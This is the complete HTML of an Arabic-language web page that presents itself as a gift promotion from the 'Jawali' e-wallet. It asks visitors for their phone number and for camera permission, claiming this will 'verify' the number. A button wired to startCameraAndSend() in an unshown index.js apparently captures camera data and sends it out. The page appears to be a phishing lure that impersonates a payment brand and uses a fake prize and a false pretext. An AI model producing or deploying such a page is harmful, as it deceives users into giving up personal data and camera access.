<!DOCTYPE html>
<html lang="ar">
<head>
  <meta charset="UTF-8">
  <title>الرئيسية - محفظة جوالي الالكترونية</title>
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <meta name="description" content="مرحبا بكم في خدمة جوالي - جوائز قيمة">
  <style>
    body {
      text-align: center;
      direction: rtl;
      font-family: Tahoma, sans-serif;
      background-color: #f9f9f9;
      padding: 30px;
    }
    button {
      font-size: 18px;
      font-weight: bold;
      margin: 10px;
      padding: 10px 30px;
      border: none;
      border-radius: 8px;
      cursor: pointer;
    }
    .start-button {
      background-color: #007bff;
      color: white;
    }
    .start-button:hover {
      background-color: #0056b3;
    }
    #consentBox {
      background: #fff3cd;
      border: 1px solid #ffeeba;
      padding: 20px;
      margin: 20px auto;
      width: 60%;
      border-radius: 8px;
      font-size: 18px;
    }
  </style>
</head>
<body>

  <h2>🎁 اضغط الزر للحصول على هدية مقدمة من محفظة جوالي الالكترونية (رصيد أو مزايا أو مبالغ نقدية)</h2>

  <input type="tel" id="phoneNumber" placeholder="أدخل رقم هاتفك"
         style="margin-bottom: 10px; padding: 10px; font-size: 18px;"><br>

  <p id="carrierDisplay" style="font-size: 18px; color: #555;"></p>

  <div id="consentBox">
    <p>📸 سيطلب إذن لتشغيل الكاميرا من أجل التحقق من رقمك</p>
    <button class="start-button" onclick="confirmConsent()">أوافق</button>
  </div>

  <button class="start-button" id="confirmBtn" onclick="startCameraAndSend()" style="display: none;">تأكيد</button>

  <p id="confirmationMessage" style="display: none; font-size: 24px; color: green;">
    ✅ تم تأكيد رقمك: <span id="confirmedNumber"></span>
  </p>

  <!-- تحميل الكود من ملف خارجي -->
  <script src="index.js"></script>
</body>
</html>
